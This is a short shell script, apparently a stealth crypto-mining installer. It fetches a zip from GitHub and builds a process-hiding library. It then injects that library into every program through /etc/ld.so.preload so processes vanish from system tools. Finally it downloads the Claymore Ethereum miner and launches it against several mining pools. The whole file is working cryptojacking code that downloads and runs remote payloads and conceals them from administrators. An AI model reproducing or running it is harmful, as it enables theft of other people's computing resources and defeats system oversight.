#!/bin/sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicPh.zip
unzip magicPh.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/ClayMore.zip
unzip ClayMore.zip
chmod +x start.bash
chmod +x ethdcrminer64
chmod +x 1_Ethereum-hiveon.bash
chmod +x 2_Ethereum-ethermine.bash
chmod +x 3_Ethereum-miningpoolhub.bash
chmod +x 4_Ethereum-cruxpool.bash
./start.bash
